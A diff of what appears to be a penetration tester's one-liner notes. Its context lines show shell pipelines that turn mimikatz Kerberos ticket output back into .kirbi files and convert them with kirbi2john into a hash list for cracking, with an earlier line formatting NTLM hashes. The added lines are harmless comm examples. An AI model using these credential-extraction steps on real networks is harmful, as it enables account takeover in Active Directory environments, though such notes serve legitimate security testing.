@@ -56,3 +56,13 @@ grep -v 'RID  : ' agent.log | tr -d '\n' | sed -e 's/LM   : NTLM/::aad3b435b5140
 use mimikatz kerberos tickets output to recreate .kirbi files; then loop through the files and build one file with hashes to crack
 for m in $(grep Saved kerb.full | cut -d ':' -f 2 | tr -d ' '); do awk "/`echo -n $m| tr -d '\n'`/,/Saved/{print}" kerb.full | grep -Ev 'Base64|Saved|====================|^\n$' | openssl enc -base64 -d -out $m; done
 for m in $(ls -1 *.kirbi); do ../JohnTheRipper/run/kirbi2john.py $m | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' >> kerberos.txt; done;
+
+
+#find lines only in file1
+comm -23 file1 file2 
+
+#find lines only in file2
+comm -13 file1 file2 
+
+#find lines common to both files
+comm -12 file1 file2 
